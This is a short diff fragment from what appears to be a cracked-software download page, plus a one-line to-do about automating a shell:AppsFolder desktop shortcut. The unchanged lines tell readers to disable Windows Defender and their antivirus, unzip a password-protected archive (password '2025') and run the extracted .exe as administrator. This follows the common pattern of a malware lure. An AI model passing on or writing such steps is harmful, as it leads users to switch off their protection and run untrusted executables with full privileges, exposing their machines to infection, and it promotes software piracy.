@@ -38,3 +38,5 @@ Step 1: If you do not have this program you can download it here.
 Step 2: Temporary disable Windows Defender and Antivirus. It is needed for they don’t block the Crack File.
 Step 3: Download the file, unzip using WinRAR. Password for unzip – “2025“
 Step 4: Open .exe file Run as administrator!
+
+add thing that automates adding shell:AppsFolder to desktop.
